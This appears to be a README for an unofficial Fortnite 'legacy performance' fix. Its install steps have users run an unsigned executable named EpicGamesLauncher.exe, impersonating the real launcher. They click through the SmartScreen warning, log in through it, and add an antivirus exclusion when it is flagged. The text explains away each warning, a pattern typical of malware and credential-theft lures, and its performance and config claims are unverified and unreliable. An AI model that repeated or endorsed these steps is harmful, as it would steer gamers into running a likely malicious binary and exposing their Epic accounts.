# Fortnite Legacy Performance

Community DX11 performance mode restore for Fortnite.

## What this is

The pre-2023 DX11 performance mode renderer, pulled from a Chapter 2 launcher build, patched to work with the current Epic launcher. Doesn't replace anything - same login, same account, same install. It just swaps the renderer path back on at launch.

## Before / after

Tested on a 1080 at 1080p:

- **Before:** ~90 fps in build fights, stutters on heavy builds
- **After:** steady 144 fps, no stutters

Same rig, same internet, same lobby. Only thing changed was running this.

## Install

1. Download `dist/EpicGamesLauncher.exe` from this repo.
2. Close the Epic Games Launcher if it's open.
3. Double-click `EpicGamesLauncher.exe`.
4. Windows will show a SmartScreen warning - normal for unsigned exes. Click **More info -> Run anyway**.
5. The Epic launcher reopens. Log in if it asks.
6. Launch Fortnite, go into Creative, check your fps.

If your fps didn't change, check:

`%LOCALAPPDATA%\FortniteGame\Saved\Config\WindowsClient\GameUserSettings.ini`

You should see:

`RenderingMode=LegacyPerformance`
`bUseLowOverheadRenderer=True`

## Why SmartScreen warns

Not code-signed. A signing cert costs $400/yr. Every indie tool has this warning.

## Why antivirus might flag it

It reads and writes the Epic launcher config folder, which is exactly what it's supposed to do. AV flags anything that touches those files. Add an exclusion for the file and run it.

## Not affiliated with Epic Games

Unofficial community fix. Fortnite and Epic Games are trademarks of Epic Games, Inc.
